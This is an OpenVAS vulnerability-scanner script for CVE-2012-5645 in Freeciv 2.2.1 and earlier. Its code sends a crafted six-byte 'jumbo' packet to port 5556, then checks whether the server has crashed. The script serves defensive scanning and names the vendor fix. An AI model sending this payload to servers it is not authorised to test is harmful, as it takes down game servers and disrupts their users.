###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeciv_multiple_dos_vuln.nasl 4689 2016-12-06 13:13:22Z cfi $
#
# Freeciv Multiple Remote Denial Of Service Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803172");
  script_version("$Revision: 4689 $");
  script_cve_id("CVE-2012-5645");
  script_bugtraq_id(41352);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 14:13:22 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2013-02-21 15:50:07 +0530 (Thu, 21 Feb 2013)");
  script_name("Freeciv Multiple Remote Denial Of Service Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(5556);

  script_xref(name:"URL", value:"http://aluigi.org/poc/freecivet.zip");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/freecivet-adv.txt");

  tag_impact = "Successful exploitation will allow attackers to cause denial of
  service condition.

  Impact Level: Application";

  tag_affected = "Freeciv Version 2.2.1 and prior";

  tag_insight = "- Malloc exception in 'jumbo' packet within the common/packet.c.
  Endless loop in packets PACKET_PLAYER_INFO, PACKET_GAME_INFO,
  PACKET_EDIT_PLAYER_CREATE, PACKET_EDIT_PLAYER_REMOVE, PACKET_EDIT_CITY
  and PACKET_EDIT_PLAYER use some particular functions that can be tricked
  into an endless loop that freezes the server with CPU at 100%.";

  tag_solution = "Update to version 2.2.2 or later,
  For updates refer to http://www.freeciv.org";

  tag_summary = "This host is running Freeciv and is prone to multiple denial of
  service vulnerabilities.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


## Variable Initialization
soc = "";
req = "";

## Freeciv Server default port
frcviPort = 5556;

## Check the port status
if(!get_port_state(frcviPort)){
  exit(0);
}

## Application confirmation is not possible
## exit if socket is not created
soc = open_sock_tcp(frcviPort);
if(!soc){
  exit(0);
}

## Construct an attack request
req = raw_string(0xff, 0xff, 0x00, 0x00, 0x00, 0x00);

## Sending Request
send(socket:soc, data:req);
close(soc);

sleep(5);

## check the port and confirmed the crash or not
soc = open_sock_tcp(frcviPort);
if(!soc)
{
  security_message(frcviPort);
  exit(0);
}

close(soc);
